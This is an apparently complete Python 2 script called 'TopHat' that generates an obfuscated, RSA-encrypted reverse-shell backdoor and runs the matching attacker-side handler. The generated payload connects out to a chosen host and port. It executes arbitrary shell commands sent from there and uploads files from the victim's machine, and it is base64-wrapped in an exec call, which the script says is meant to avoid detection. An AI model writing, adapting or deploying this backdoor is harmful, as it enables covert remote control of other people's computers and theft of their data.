#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import os
import sys
import time
import base64
from Crypto.PublicKey import RSA
from Crypto.PublicKey import RSA
from subprocess import check_output

if len(sys.argv) == 3:
	addresser = sys.argv[1]
	porterica = sys.argv[2]
else:
	print """
 _____           _   _       _   
|_   _|__  _ __ | | | | __ _| |_ 
  | |/ _ \| '_ \| |_| |/ _` | __|
  | | (_) | |_) |  _  | (_| | |_ 
  |_|\___/| .__/|_| |_|\__,_|\__|
          |_|                    

Description:
	TopHat is a inspired by metasploits capabilties of meterpreter however i have coded a script to generate a -
	undetected encrypted backdoor using python.

Usage:
	./TopHat <lhost> <lport>
	"""
	sys.exit()

print "[*] Generating SSL Certificates"
time.sleep(3)
#Generate new key that's 4096 bits long
new_key = RSA.generate(4096)

#Export the key in PEM format
public_key = new_key.publickey().exportKey("PEM")
private_key = new_key.exportKey("PEM")
backdoor_code_ot = """
import socket
import subprocess
import os
from Crypto.PublicKey import RSA

def encrypt(message):
    publickey = '''""" + public_key + """'''
    
    encryptor = RSA.importKey(publickey)
    encryptedData = encryptor.encrypt(message, 0)
    return encryptedData[0]



def decrypt(cipher):
    privatekey = '''""" + private_key + """'''
    
    decryptor = RSA.importKey(privatekey)
    return decryptor.decrypt(cipher)

def transfer(s,path):
    
    if os.path.exists(str(path)):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

    else:
        s.send('File not found')


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('""" + addresser + """',""" + porterica + """))

    while True:
        command = decrypt(s.recv(1024))

        if 'exit' in command:
            s.close()
            break

        if 'grab' in command:
            grab, path = command.split('*')

            try:
                transfer(s, path)
            except Exception, e:
                s.send(str(e))
                pass
            
            

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = CMD.stdout.read()
            if len(result) > 512:
                for i in range(0, len(result), 512):
                    chunk = result[0+i:512+i]
                    s.send(encrypt(chunk))
            else:
                s.send(encrypt(result))
            #s.send(encrypt(CMD.stderr.read()))

def main():
    connect()

if __name__ == '__main__':
    main()
"""
backerraka = base64.b64encode(backdoor_code_ot)
backdoor_code = "import base64, sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + backerraka + "')))"

def encrypt(message):
    publickey = public_key
    
    encryptor = RSA.importKey(publickey)
    encryptedData = encryptor.encrypt(message, 0)
    return encryptedData[0]



def decrypt(cipher):
    privatekey = private_key
    
    decryptor = RSA.importKey(privatekey)
    return decryptor.decrypt(cipher)


def transfer(conn, command):

    conn.send(command)
    f = open('/root/Desktop/somefile', 'wb')
    while True:
        bits = conn.recv(1024)
        if 'File not found' in bits:
            print '[-] File not found'
            break
        if bits.endswith('DONE'):
            print '[-] File transfer complete'
            f.close()
            break
        f.write(bits)
    f.close()


def connect():
    print "[*] Creating Backdoor..."
    liag = open("backdoor.py","w")
    liag.write(backdoor_code)
    liag.close()
    print "[*] Started reverse handler on %s:%s" % (addresser,porterica)
    print "[*] Starting the payload handler..."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((addresser,int(porterica)))
    s.listen(1)
    conn, addr = s.accept()
    print '[*] TopHat session 1 opened %s:%s -> %s\n' % (addresser,porterica,addr)
    while True:
        store = ''
        command = raw_input("tophat > ")
        command = encrypt(command)

        if 'exit' in command:
            #Send terminate signal to the client
            conn.send('exit')
            #Close the connection to the client on the server end
            conn.close()
            sys.exit()

        if 'grab' in command:
            transfer(conn, command)

        else:
            conn.send(command)
            result = conn.recv(1024)
            if len(decrypt(result)) == 512:
                store = store + decrypt(result)
                result = conn.recv(512)
                store = store + decrypt(result)

            else:
                print decrypt(result)

def main():
    connect()

if __name__ == '__main__':
    main()

